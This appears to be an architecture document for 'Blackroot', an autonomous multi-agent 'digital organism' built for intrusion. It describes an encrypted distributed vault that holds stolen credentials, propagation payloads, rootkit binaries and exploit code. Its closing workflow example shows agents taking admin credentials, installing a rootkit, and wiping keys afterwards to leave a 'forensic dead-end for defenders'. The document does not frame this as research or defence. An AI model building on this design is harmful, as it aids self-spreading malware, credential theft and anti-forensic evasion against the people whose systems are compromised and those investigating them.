## Three-Tier Encrypted Memory Architecture for Digital Organisms

### Tier 1: Ephemeral Coordination (Redis, DB 0)
**Purpose**: Fast, volatile state sharing across agent swarm

```
Key patterns:
  agent:{agent_id}:heartbeat    -> timestamp
  agent:{agent_id}:state        -> JSON (running, idle, error)
  task:queue:{priority}         -> [task_ids]
  swarm:peers                   -> {node_id: peer_info}
  ledger:treasury               -> balance
  ledger:agent:{id}:wallet      -> budget
```

**TTL**: Minutes to hours (volatile, transient)
**Encryption**: None (coordination only)
**Replication**: Built-in Redis clustering

**Agents that use this**:
- PeerLinkerAgent (discovery, DHT)
- Enforcer (rule consensus)
- Accountant (economic coordination)

---

### Tier 2: Persistent Structured Data (PostgreSQL or Redis Streams)
**Purpose**: Immutable audit trail, mission history, metrics

```
Tables:
  missions (id, agent_id, status, created_at, completed_at)
  events (id, agent_id, event_type, payload, timestamp)
  metrics (id, agent_id, metric_name, value, timestamp)
  escalations (id, source_agent, technique, result, timestamp)
```

**TTL**: Retention policy (days/months/years)
**Encryption**: At-rest encryption if sensitive fields
**Immutability**: Append-only (WORM)

**Agents that use this**:
- ScoutAgent (mission logs)
- RepairAgent (health history)
- LearningAgent (behavioral metrics)

---

### Tier 3: Encrypted Artifact Vault (BlackVault Distributed)
**Purpose**: Secrets, payloads, identity material

```
Redis keys (encrypted blobs):
  vault:artifact:{content_hash}   -> envelope(KEK(DEK) + AES-GCM(payload))
  vault:metadata:{content_hash}   -> {name, size, expiry, created_at}
  vault:index:{node_id}           -> set of content_hashes this node has
  vault:master:{node_id}          -> KEK (encrypted in transit only)
  vault:salt:{node_id}            -> salt
```

**Encryption**: Envelope encryption (per-artifact DEK + KEK)
**TTL**: Artifact-specific expiry
**Deduplication**: Content-based (SHA256)
**Replication**: Pub/Sub broadcasts to peers

**Agents that use this**:
- InfiltratorAgent (stolen credentials)
- PropagationAgent (payloads)
- GhostLayerDaemon (rootkit binaries)
- PayloadEngine (exploit code)

---

## Operational Guarantees

### Master Key Destruction = Instant Wipe
```python
vault.destroy_master_key()
# All artifacts instantly unrecoverable
# Master key deleted from Redis
# No file overwrite needed
# Cryptographic erasure via key destruction
```

### Multi-Node Scenario
```
Node A (Infiltrator)          Node B (Propagation)         Node C (Ghost)
|                              |                             |
+-- stores creds              +-- stores payload            +-- stores rootkit
    (hash: abc123...)            (hash: def456...)             (hash: ghi789...)
|                              |                             |
v                              v                             v
vault:artifact:abc123... <----|----vault:replicate--------> vault:index:C
vault:index:A                 Event Broadcast               updates local index
                              "Node A has abc123"

Peer can request: "Give me abc123"
Response: encrypted envelope + node_A_retrieves_and_forwards
```

### Key Rotation with Rewrap
```python
vault.rotate_key()
# 1. Generate new master key
# 2. For each artifact:
#    - Decrypt with OLD master key -> plaintext
#    - Encrypt with NEW master key -> new envelope
#    - Store in Redis
# 3. Delete old key from memory
# 4. Broadcast rotation event to peers
```

---

## Threat Models Addressed

### ❌ Threat: Stolen .key file → compromise everything
**Mitigation**: 
- Master key NOT stored on disk (kept in Redis memory only)
- Or: Master key encrypted at transit, stored encrypted in Redis
- Forward secrecy via per-artifact DEK (each artifact uses unique key)

### ❌ Threat: SSD wear-leveling prevents secure deletion
**Mitigation**:
- Don't rely on file overwrite
- Destroy master key instead (cryptographic erasure)
- All artifacts become unrecoverable instantly

### ❌ Threat: One compromised node → compromise all
**Mitigation**:
- Artifacts can be replicated with only envelope header (encrypted DEK)
- Node A's master key ≠ Node B's master key
- Per-node master keys prevent single-point-of-failure

### ❌ Threat: Duplicate artifacts waste storage
**Mitigation**:
- Content-based hashing (SHA256)
- Same data = same envelope, stored once
- Multiple nodes can reference same hash

---

## Integration Pattern with Main Agents

```python
# In agents/scout.py
from black_vault_distributed import DistributedBlackVault

class ScoutAgent(BaseAgent):
    def __init__(self, ...):
        self.vault = DistributedBlackVault(node_id=self.codename)
    
    def discover_credentials(self):
        creds = {...}
        hash = self.vault.store(
            name=f"creds_{self.target}",
            data=json.dumps(creds).encode(),
            expire_minutes=1440  # 1 day
        )
        return hash

# In agents/propagation_agents.py
class PropagationAgent(BaseAgent):
    def __init__(self, ...):
        self.vault = DistributedBlackVault(node_id=self.codename)
    
    def fetch_payload(self, content_hash):
        payload = self.vault.retrieve(content_hash)
        return payload

# In kernel/core.py
kernel.vault = DistributedBlackVault(node_id=kernel.id)
register_module("vault", lambda: kernel.vault)
```

---

## Monitoring & Alerts

**Key metrics to track**:
- `vault:operations:store` -> counter
- `vault:operations:retrieve` -> counter
- `vault:deduplication:ratio` -> (unique hashes / total stores)
- `vault:master_key:age` -> days since rotation
- `vault:replication:peers` -> connected nodes
- `vault:wipe:events` -> cryptographic erasures

**Alerts**:
- Master key age > 30 days → rotate
- Store without retrieve > 1 week → artifact abandoned?
- Replication lag > 5 seconds → network issues

---

## Example: Complete Secure Workflow

```python
# 1. Scout finds credentials
scout = ScoutAgent()
creds_hash = scout.vault.store(
    name="ad_creds_prod",
    data=b'{"user": "admin", "pass": "xxx"}',
    expire_minutes=720  # 12 hours
)

# 2. Propagation agent requests payload
propagation = PropagationAgent(vault=scout.vault)
creds = propagation.vault.retrieve(creds_hash)  # Decrypts envelope

# 3. Ghost layer uses creds to install rootkit
ghost = GhostLayerDaemon()
rootkit_hash = ghost.vault.store(
    name="rootkit_kernel_v4",
    data=compiled_rootkit_binary,
    expire_minutes=10080  # 7 days
)

# 4. After mission: destroy master keys for operational security
if mission_complete:
    scout.vault.destroy_master_key()
    propagation.vault.destroy_master_key()
    ghost.vault.destroy_master_key()
    # All artifacts unrecoverable; forensic dead-end for defenders
```

---

## Deployment Checklist

- [ ] Redis running on 6379, DB 1 reserved for vault
- [ ] Master keys backed up (if recovery needed post-wipe)
- [ ] Vault replication pub/sub configured
- [ ] Key rotation scheduled (weekly recommended)
- [ ] Artifact expiry policies set per agent type
- [ ] Monitoring/alerting on vault operations
- [ ] Disaster recovery plan for Redis data loss

---

## Why This Works for Digital Organisms

The three-tier model mirrors biological nervous systems:

| Tier | Biology | Blackroot |
|------|---------|-----------|
| Layer 1 | Synaptic transmission | Redis (fast coordination) |
| Layer 2 | Memory consolidation | Audit logs (permanent record) |
| Layer 3 | Instincts/reflexes | Encrypted vault (survival instincts) |

**Distributed BlackVault** = The organism's encrypted instincts, accessible to all nodes, instantly erasable if necessary.
